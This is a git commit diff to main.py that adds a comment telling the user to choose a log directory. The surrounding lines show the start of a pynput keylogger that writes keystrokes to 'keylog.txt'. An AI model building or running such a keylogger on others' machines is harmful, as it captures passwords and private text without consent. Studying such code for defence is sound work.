172650f9077d15be0c38432e4b18f97936698729
Ayoub-So <134612199+Ayoub-So@users.noreply.github.com>
2024-01-27 00:19:29 +0100

    Update main.py

--- main.py
+++ main.py
@@ -2,7 +2,7 @@
 import pynput
 from pynput.keyboard import Key, Listener
 import logging
-log_dir = r"C:/"
+log_dir = r"C:/"   #choose here a path to log directory
 logging.basicConfig(filename=(log_dir + r"/keylog.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
 def on_press(Key):
